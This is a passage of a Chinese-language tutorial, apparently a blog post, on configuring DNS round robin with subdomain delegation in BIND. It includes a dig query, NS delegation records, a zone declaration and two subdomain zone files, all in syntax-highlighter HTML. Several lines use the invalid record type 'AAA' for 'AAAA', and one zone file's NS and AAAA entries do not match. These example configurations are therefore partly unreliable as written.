class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c971693852546-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c971693852546-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c971693852546-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dig</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">ns</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com </span><span class=\"crayon-i\">fileserv</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-i\">AAA</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c971693852546-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>它将同时显示出 IPv4 和 IPv6 的轮询记录。</p>\n<h3 id=\"toc_2\">子域委派和轮询</h3>\n<p>子域委派结合轮询要做的配置会更多，但是这样有一些好处。当你有多个子域或者地理位置比较分散的服务器时，就应该去使用它。它的响应时间更快，并且宕机的服务器不会去响应，因此客户端不会因为等待回复而被挂住。一个短的 TTL，比如 60 秒，就能帮你做到。</p>\n<p>这种方法需要多台域名服务器。在最简化的场景中，你需要一台主域名服务器和两个子域，每个子域都有它们自己的域名服务器。在子域服务器上配置你的轮询记录，然后在你的主域名服务器上配置委派。</p>\n<p>在主域名服务器上的 BIND 中，你至少需要两个额外的配置，一个区声明以及在区数据文件中的 A/AAAA 记录。主域名服务器中的委派应该像如下的内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c975828230737\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nns1.sub.example.com. IN A 172.16.1.20\r\nns1.sub.example.com. IN AAAA fd02:faea:f561:8fa0:1::20\r\nns2.sub.example.com. IN A 172.16.1.21\r\nns2.sub.example.com. IN AAA fd02:faea:f561:8fa0:1::21\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN NS ns2.sub.example.com.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c975828230737-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c975828230737-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c975828230737-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c975828230737-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c975828230737-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c975828230737-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c975828230737-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c975828230737-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c975828230737-1\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c975828230737-2\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c975828230737-3\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c975828230737-4\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c975828230737-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c975828230737-6\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c975828230737-7\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c975828230737-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>接下来的每台子域服务器上有它们自己的区文件。在这里它的关键点是每个服务器去返回它<strong>自己的</strong> IP 地址。在 <code>named.conf</code> 中的区声明，所有的服务上都是一样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c984173485580\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzone \"sub.example.com\" {\r\n    type master;\r\n    file \"db.sub.example.com\";\r\n};\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c984173485580-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c984173485580-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c984173485580-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c984173485580-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c984173485580-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c984173485580-1\"><span class=\"crayon-i\">zone</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"sub.example.com\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c984173485580-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c984173485580-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"db.sub.example.com\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c984173485580-4\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c984173485580-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>然后数据文件也是相同的，除了那个 A/AAAA 记录使用的是各个服务器自己的 IP 地址。SOA 记录都指向到主域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c988073943130\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n; first subdomain name server\r\n$ORIGIN sub.example.com.\r\n$TTL 60\r\nsub.example.com  IN SOA ns1.example.com. admin.example.com. (\r\n        2018123456      ; serial\r\n        3H              ; refresh\r\n        15              ; retry\r\n        3600000         ; expire\r\n)\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN A  172.16.1.20\r\nns1.sub.example.com.  IN AAAA  fd02:faea:f561:8fa0:1::20\r\n; second subdomain name server\r\n$ORIGIN sub.example.com.\r\n$TTL 60\r\nsub.example.com  IN SOA ns1.example.com. admin.example.com. (\r\n        2018234567      ; serial\r\n        3H              ; refresh\r\n        15              ; retry\r\n        3600000         ; expire\r\n)\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN A  172.16.1.21\r\nns2.sub.example.com.  IN AAAA  fd02:faea:f561:8fa0:1::21\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c988073943130-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c988073943130-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-1\"><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">subdomain </span><span class=\"crayon-e\">name </span><span class=\"crayon-i\">server</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">ORIGIN </span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">TTL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-4\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SOA </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">2018123456</span><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">serial</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3H</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">refresh</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">retry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3600000</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">expire</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-9\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-11\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-12\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-13\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA  </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-14\"><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">second </span><span class=\"crayon-e\">subdomain </span><span class=\"crayon-e\">name </span><span class=\"crayon-i\">server</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-15\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">ORIGIN </span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-16\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">TTL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-17\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SOA </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">2018234567</span><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">serial</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3H</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">refresh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">retry</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3600000</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">expire</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-22\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-24\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c988073943130-25\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c988073943130-26\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span 